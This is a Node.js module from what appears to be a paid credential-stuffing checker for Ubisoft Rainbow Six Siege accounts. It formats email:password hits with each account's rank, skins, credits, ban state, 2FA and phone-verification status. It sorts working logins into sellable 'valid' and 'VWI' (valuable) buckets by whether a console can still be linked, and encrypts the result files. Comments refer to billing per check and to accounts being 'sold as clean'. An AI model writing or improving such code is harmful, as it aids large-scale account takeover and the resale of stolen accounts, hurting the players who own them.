// Format a single bulk-check result line and encrypt/decrypt result files.
//
// Line format (per spec):
//   email:pass | username | level | total_items | credits/renown | Profile: URL
// For non-success outcomes, replace the right-hand fields with a status tag
// (INVALID, 2FA_REQUIRED, ERROR_RETRY, ERROR_NETWORK, PARTIAL).
//
// On-disk: AES-256-GCM, iv(12) || tag(16) || ciphertext. Key from .env.

const fs     = require('fs');
const crypto = require('crypto');
const {
  detectWantedSkins, detectTopRanks,
  formatWantedSkins, formatWantedRanks,
} = require('./skinCheck');

const SITE_URL = process.env.SITE_URL || 'http://localhost:3000';

// Comma-thousands for big numbers so the eye can parse `82,776` instead of `82776`.
function comma(n) { return String(n ?? 0).replace(/\B(?=(\d{3})+(?!\d))/g, ','); }

// Count items in a playerData object the same way recordPlayerCheck does in server.js.
function countItems(playerData) {
  if (!playerData?.sections) return 0;
  return playerData.sections.reduce((sum, s) => {
    if (s.grouped) {
      return sum + (s.items?.length || 0) + (s.groups?.reduce((a, g) => a + (g.items?.length || 0), 0) || 0);
    }
    return sum + (s.items?.length || 0);
  }, 0);
}

// Inner value (no leading " | ") so it composes cleanly with the new
// labeled-fields format. Returns the still-linkable platforms, or "—" if none.
//
// A console is linkable ONLY if no account of that platform is tied to the
// Ubisoft account — neither currently linked NOR a ghost (previously linked).
// A ghost means that console was already linked once, so it can't be linked
// again → it must NOT count as linkable.
function linkableTagInner(playerData) {
  const taken = new Set();
  const mark = (p) => {
    p = String(p || '').toLowerCase();
    if (p === 'xbox' || p === 'xbl') taken.add('xbx');
    else if (p === 'psn') taken.add('psn');
  };
  for (const a of (playerData?.linkedAccounts ?? [])) mark(a.platform); // current + ghost
  for (const p of (playerData?.linkedPlatforms ?? [])) mark(p);         // fallback
  const missing = [];
  if (!taken.has('xbx')) missing.push('XBX');
  if (!taken.has('psn')) missing.push('PSN');
  return missing.length ? missing.join('/') : '—';
}

// Kept for back-compat with anything that called the leading-pipe versions.
function linkableTag(playerData) {
  const inner = linkableTagInner(playerData);
  return inner === '—' ? '' : ` | Linkable: ${inner}`;
}
function bannedTag(playerData) {
  return ` | Banned: ${playerData?.banned ? 'Y' : 'N'}`;
}

// Build the success-case line. Labels every field so the operator can
// eyeball what each piece is without counting pipes. Comma-thousands on
// large numbers. Wanted ranks (Plat/Emerald/Diamond/Champion) and wanted
// skin families (Glacier, Obsidian, Chroma Streaks, Spellbound) are
// surfaced as their own fields so high-value accounts pop out at a glance.
// "2025-07-13 (playstation)" from stats.cc last-played + linked devices, or "—".
function formatLastPlayed(pd) {
  if (!pd?.lastPlayedAt) return '—';
  const d = new Date(pd.lastPlayedAt);
  if (isNaN(d.getTime())) return '—';
  const date = d.toISOString().slice(0, 10);
  const devs = [...new Set((pd.lastPlayedDevices || []).map(x => x && x.platform).filter(Boolean))];
  return devs.length ? `${date} (${devs.join(', ')})` : date;
}

// R6 Siege gates ranked-mode play at Clearance Level 20 — you literally can't
// queue Ranked below it. Ubi's Y8+ crossplay endpoints (and tracker.gg's cross-
// progression 'ubi' responses) merge PC + Xbox + PSN ranked play into ONE stat
// bucket per Ubi account, so a Ubi account whose PC login only got to Lvl 10
// still shows the Diamond that a linked Xbox actually earned. Operator spec is
// "PC/Ubi account only". Suppress ranks whenever the PC clearance level is
// confirmed below 20 — those ranks can't have been earned on this login.
// Level 0 = statscard fetch failed (unknown) → keep ranks visible so a legit
// high-rank account whose level-lookup broke isn't wrongly blanked.
const RANKED_UNLOCK_LEVEL = 20;
function ranksBlockedByLevel(playerData) {
  const n = Number(playerData?.level);
  return Number.isFinite(n) && n > 0 && n < RANKED_UNLOCK_LEVEL;
}

function formatSuccess(email, password, playerData) {
  const username  = playerData?.username || '?';
  const level     = playerData?.level ?? '?';
  const items     = countItems(playerData);
  const credits   = playerData?.credits ?? 0;
  const renown    = playerData?.renown  ?? 0;
  const profile   = playerData?.userId ? `${SITE_URL}/profile/${playerData.userId}` : '-';
  const ranks     = ranksBlockedByLevel(playerData)
    ? '—'                                        // PC login can't queue Ranked
    : formatWantedRanks(detectTopRanks(playerData));
  const skins     = formatWantedSkins(detectWantedSkins(playerData));
  const linkable  = linkableTagInner(playerData);
  // Y = sanctioned, N = confirmed clean, ? = ban check didn't complete (don't
  // imply "clean" when we couldn't actually verify it).
  const banned    = playerData?.banned ? 'Y' : (playerData?.banChecked === false ? '?' : 'N');

  return [
    `${email}:${password}`,
    `User: ${username}`,
    `Lvl: ${level}`,
    `Items: ${comma(items)}`,
    `Credits: ${comma(credits)}`,
    `Renown: ${comma(renown)}`,
    `Ranks: ${ranks}`,
    `Skins: ${skins}`,
    `Linkable: ${linkable}`,
    `Banned: ${banned}`,
    `2FA: ${playerData?.twoFactor ? 'Y' : 'N'}`,
    // Y = verified, N = not verified, ? = couldn't fetch account status.
    `EmailVerified: ${playerData?.emailVerified == null ? '?' : (playerData.emailVerified ? 'Y' : 'N')}`,
    `PhoneVerified: ${playerData?.phoneVerified == null ? '?' : (playerData.phoneVerified ? 'Y' : 'N')}`,
    `LastPlayed: ${formatLastPlayed(playerData)}`,
    `Profile: ${profile}`,
  ].join(' | ');
}

function formatStatus(email, password, tag) {
  return `${email}:${password} | ${tag}`;
}

function formatPartial(email, password, username) {
  return `${email}:${password} | ${username || '?'} | PARTIAL`;
}

// ── Billing decision ─────────────────────────────────────────────────────
// Returns one of: 'success'|'invalid'|'twofa'|'retry'|'network'|'partial'
// Caller already separated login-step errors from getPlayerData errors so
// we know which phase failed.
function decideOutcome({ loginError, playerData, playerDataError }) {
  if (loginError) {
    const status = loginError.response?.status;
    const msg = String(loginError.message || '');
    // Check 2FA messages BEFORE the 401-status branch — auth.js throws 2FA errors
    // with status=401 + a "2-step verification" message; the 401 branch would
    // otherwise swallow them and mis-classify 2FA accounts as INVALID.
    if (/2-step|two.?factor|2fa/i.test(msg)) return 'twofa';
    if (status === 401 || /wrong email|wrong password|invalid/i.test(msg)) return 'invalid';
    if (status === 502 || /anti-bot|rate.?limit|tries|exhaust/i.test(msg)) return 'retry';
    return 'network';
  }
  if (playerData) return 'success';
  if (playerDataError) return 'partial';
  return 'network';
}

function isBillable(outcome) {
  // Per spec billing table: success, invalid (definitive 401), partial
  return outcome === 'success' || outcome === 'invalid' || outcome === 'partial';
}

function formatLine(email, password, outcome, playerData) {
  switch (outcome) {
    case 'success': return formatSuccess(email, password, playerData);
    case 'invalid': return formatStatus(email, password, 'INVALID');
    case 'twofa':   return formatStatus(email, password, '2FA_REQUIRED');
    case 'retry':   return formatStatus(email, password, 'ERROR_RETRY');
    case 'network': return formatStatus(email, password, 'ERROR_NETWORK');
    case 'partial': return formatPartial(email, password, playerData?.username);
    default:        return formatStatus(email, password, 'ERROR_UNKNOWN');
  }
}

// ── AES-256-GCM encryption ──────────────────────────────────────────────
function getKey() {
  const hex = process.env.RESULTS_ENC_KEY || '';
  if (hex.length !== 64) throw new Error('RESULTS_ENC_KEY must be 64 hex chars (32 bytes).');
  return Buffer.from(hex, 'hex');
}

// On-disk layout: iv(12) || ciphertext || tag(16). Tag at the END so we can
// stream-encrypt arbitrarily large files (1M+ result lines) without holding
// the whole thing in memory.
function encryptToFile(filePath, plaintext) {
  const key = getKey();
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  const ct = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  fs.writeFileSync(filePath, Buffer.concat([iv, ct, tag]));
}

// Stream-encrypt a plaintext file → encrypted file. Constant memory regardless
// of size. Used by the bulk runner so a 1M-line job never buffers in RAM.
function encryptFileStream(srcPath, destPath) {
  return new Promise((resolve, reject) => {
    const key = getKey();
    const iv = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
    const out = fs.createWriteStream(destPath);
    out.on('error', reject);
    out.write(iv);                                  // iv first
    const src = fs.createReadStream(srcPath);
    src.on('error', reject);
    src.pipe(cipher);
    cipher.on('data', (chunk) => out.write(chunk)); // ciphertext
    cipher.on('end', () => {
      out.write(cipher.getAuthTag());               // tag last
      out.end();
    });
    out.on('close', resolve);
  });
}

// Read iv (first 12 bytes) + tag (last 16 bytes) without loading the file.
function readIvAndTag(filePath) {
  const fd = fs.openSync(filePath, 'r');
  try {
    const size = fs.fstatSync(fd).size;
    const iv = Buffer.alloc(12); fs.readSync(fd, iv, 0, 12, 0);
    const tag = Buffer.alloc(16); fs.readSync(fd, tag, 0, 16, size - 16);
    return { iv, tag, size };
  } finally { fs.closeSync(fd); }
}

function decryptFromFile(filePath) {
  const key = getKey();
  const { iv, tag, size } = readIvAndTag(filePath);
  const ct = Buffer.alloc(size - 28);
  const fd = fs.openSync(filePath, 'r');
  try { fs.readSync(fd, ct, 0, ct.length, 12); } finally { fs.closeSync(fd); }
  const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
  decipher.setAuthTag(tag);
  return Buffer.concat([decipher.update(ct), decipher.final()]).toString('utf8');
}

// Pull a "| Label: value" field's value (trimmed), or '' if absent.
function fieldVal(line, label) {
  const m = line.match(new RegExp(`\\|\\s*${label}:\\s*([^|]*)`));
  return m ? m[1].trim() : '';
}
// Banned accounts are excluded from valid/VWI buckets.
function isBannedLine(line) { return /\|\s*Banned:\s*Y\b/i.test(line); }
// Ban check didn't complete — must NOT count as sellable/valid.
function isBanUnverifiedLine(line) { return /\|\s*Banned:\s*\?(?:\s|\||$)/i.test(line); }

// Login succeeded but enrichment returned nothing useful (Lvl 0 / Items 0 / no
// renown). These are rate-limit shells — retry instead of writing to valid.txt.
function isHollowCapture(playerData) {
  if (!playerData?.userId) return true;
  const items = countItems(playerData);
  const hasSections = (playerData.sections?.length ?? 0) > 0;
  const level = Number(playerData.level) || 0;
  const renown = Number(playerData.renown) || 0;
  const credits = Number(playerData.credits) || 0;
  const itemsLoaded = items > 0 || hasSections;
  const statsLoaded = level > 0 || renown > 0 || credits !== 0;
  return !itemsLoaded && !statsLoaded;
}

// A capture is complete enough to record as a definitive success line.
function isCaptureComplete(playerData) {
  if (!playerData?.userId) return false;
  if (isHollowCapture(playerData)) return false;
  // When stats.cc ban check is enabled, unverified bans must retry — never valid.
  if (playerData.banChecked === false && process.env.STATSCC_CHECK !== '0') return false;
  return true;
}
// Still has a free console slot to link (Xbox or PSN). "Linkable: —" → false.
function isLinkableLine(line) { return /XBX|PSN/i.test(fieldVal(line, 'Linkable')); }
// Phone number verified on the Ubi account. "Y" (definite yes) is required for
// VWI — an unverified or missing-phone account is at ban risk and can't recover
// the account, so operator spec is "VWI needs phone verified". "?" (unknown —
// phone-status fetch failed) does NOT qualify: absence of proof is not proof.
function isPhoneVerifiedLine(line) { return /\|\s*PhoneVerified:\s*Y\b/i.test(line); }

// A "good" valid = the credentials work AND the account is actually usable:
// not banned, and still linkable to a console. A PARTIAL (login worked but the
// data fetch failed, so ban/link are unknown) is treated as valid — the
// credentials are confirmed good.
function isUsableValid(line) {
  if (/\|\s*PARTIAL(\s|$)/.test(line)) return true;
  if (!line.includes(' | User: ')) return false;
  if (isBannedLine(line)) return false;       // exclude Banned: Y
  if (isBanUnverifiedLine(line)) return false; // exclude Banned: ?
  return isLinkableLine(line);                 // exclude Linkable: —
}

// Classify a result line so downloads can be split into valid vs invalid.
//   valid   = a usable successful check (login works, not banned, linkable)
//             OR a PARTIAL. Banned / non-linkable logins are NOT valid.
//   invalid = "| INVALID" (wrong password).
//   other   = banned / non-linkable / 2FA / network / retry / unknown.
function classifyLine(line) {
  if (/\|\s*INVALID(\s|$)/.test(line)) return 'invalid';
  if (isUsableValid(line)) return 'valid';
  return 'other';
}

// 2FA = login was blocked by 2-step (2FA_REQUIRED) OR a valid account that has
// 2FA enabled ("| 2FA: Y", from the webauth check2fa endpoint).
function is2FALine(line) {
  return /\|\s*2FA_REQUIRED/.test(line) || /\|\s*2FA:\s*Y\b/i.test(line);
}

// VWI = "Valuable / Wanted Items". A successful check that has at least one
// wanted skin OR a wanted rank (Plat–Champ). Both are surfaced in the success
// line as "| Skins: …" and "| Ranks: …" (set to "—" when none), so we just
// check those two fields are non-empty. Also requires PhoneVerified: Y — an
// unverified-phone account is a resale-risk (account recovery gap + easier to
// have taken back), so operator spec is "VWI needs phone verified".
function isVwiLine(line) {
  if (!line.includes(' | User: ')) return false; // must be a successful check
  if (isBannedLine(line)) return false;          // exclude Banned: Y
  if (!isLinkableLine(line)) return false;       // exclude Linkable: —
  if (!isPhoneVerifiedLine(line)) return false;  // exclude PhoneVerified: N or ?
  const has = (v) => v && v !== '—' && v !== '-';
  return has(fieldVal(line, 'Skins')) || has(fieldVal(line, 'Ranks'));
}

// Single mutually-exclusive bucket for the live UI (window title + feed).
// One result line → exactly one of:
//   vwi | banned | valid | twofa | invalid | retry | err | other
// Ordering matters: error states first, then 2FA-blocked logins, then the
// successful-login sub-types (vwi > 2FA-enabled > banned > plain valid).
function feedStatus(line) {
  if (/\|\s*ERROR_RETRY/.test(line)) return 'retry';                 // anti-bot / rate-limit (BLK)
  if (/\|\s*ERROR_(NETWORK|UNKNOWN)/.test(line)) return 'err';       // proxy / network (ERR)
  if (/\|\s*2FA_REQUIRED/.test(line)) return 'twofa';               // login blocked by 2-step
  if (/\|\s*INVALID(\s|$)/.test(line)) return 'invalid';            // wrong password
  if (line.includes(' | User: ') || /\|\s*PARTIAL(\s|$)/.test(line)) {
    if (isBannedLine(line)) return 'banned';                        // banned → never valid/vwi
    if (isBanUnverifiedLine(line)) return 'retry';                  // ban unverified → requeue
    if (isVwiLine(line)) return 'vwi';                              // valuable + linkable + not banned
    if (/\|\s*2FA:\s*Y\b/i.test(line)) return 'twofa';             // valid + 2FA enabled
    if (isUsableValid(line)) return 'valid';                        // clean, linkable, not banned
    return 'other';                                                // valid login but Linkable: — (no slot)
  }
  return 'other';
}

// Does a line match the requested filter? ('all'|'valid'|'invalid'|'vwi'|'banned')
function lineMatches(line, want) {
  if (want === 'all') return true;
  if (want === 'vwi') return isVwiLine(line);
  // Banned = a successful login confirmed sanctioned (Banned: Y). Kept OUT of the
  // 'valid' download so banned accounts are never sold as clean; downloaded on
  // their own so the owner can sort them into Banned VWI.
  if (want === 'banned') return isBannedLine(line);
  return classifyLine(line) === want;
}

// Transform that keeps only lines matching `want` ('valid'|'invalid'|'vwi'|'all').
function makeLineFilter(want) {
  const { Transform } = require('stream');
  let buf = '';
  return new Transform({
    transform(chunk, _enc, cb) {
      buf += chunk.toString('utf8');
      const lines = buf.split('\n');
      buf = lines.pop();                 // keep the trailing partial line
      let out = '';
      for (const line of lines) {
        if (!line) continue;
        if (lineMatches(line, want)) out += line + '\n';
      }
      cb(null, out);
    },
    flush(cb) {
      if (buf && lineMatches(buf, want)) cb(null, buf + '\n');
      else cb();
    },
  });
}

// Stream-decrypt → a writable (e.g. the HTTP download response). Constant
// memory, so a 200MB result file downloads without buffering in RAM.
// opts.filter: 'all' (default) | 'valid' | 'invalid'.
function decryptFileToStream(filePath, writable, opts = {}) {
  return new Promise((resolve, reject) => {
    const key = getKey();
    const { iv, tag, size } = readIvAndTag(filePath);
    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAuthTag(tag);
    const src = fs.createReadStream(filePath, { start: 12, end: size - 17 });
    src.on('error', reject);
    decipher.on('error', reject);
    writable.on('error', reject);
    writable.on('finish', resolve);
    const want = ['valid', 'invalid', 'vwi', 'banned'].includes(opts.filter) ? opts.filter : 'all';
    if (want === 'all') {
      src.pipe(decipher).pipe(writable);
    } else {
      const filter = makeLineFilter(want);
      filter.on('error', reject);
      src.pipe(decipher).pipe(filter).pipe(writable);
    }
  });
}

// Stream-decrypt a results file and collect the set of checked emails (the part
// before the first ':' on each line, lowercased). Constant memory aside from
// the Set itself. Used to compute "unchecked" accounts server-side.
function collectEmails(filePath) {
  return new Promise((resolve, reject) => {
    const set = new Set();
    let buf = '';
    const { Writable } = require('stream');
    const sink = new Writable({
      write(chunk, _enc, cb) {
        buf += chunk.toString('utf8');
        let idx;
        while ((idx = buf.indexOf('\n')) >= 0) {
          const line = buf.slice(0, idx); buf = buf.slice(idx + 1);
          const i = line.indexOf(':'); if (i > 0) set.add(line.slice(0, i).trim().toLowerCase());
        }
        cb();
      },
      final(cb) { const i = buf.indexOf(':'); if (i > 0) set.add(buf.slice(0, i).trim().toLowerCase()); cb(); },
    });
    decryptFileToStream(filePath, sink, { filter: 'all' }).then(() => resolve(set)).catch(reject);
  });
}

module.exports = {
  countItems,
  collectEmails,
  formatLine, formatSuccess, formatStatus, formatPartial,
  linkableTag, bannedTag, linkableTagInner,
  decideOutcome, isBillable,
  encryptToFile, decryptFromFile, encryptFileStream, decryptFileToStream,
  classifyLine, isVwiLine, is2FALine, feedStatus,
  isUsableValid, isBannedLine, isBanUnverifiedLine, isLinkableLine, isPhoneVerifiedLine,
  isHollowCapture, isCaptureComplete,
  ranksBlockedByLevel, RANKED_UNLOCK_LEVEL,
};
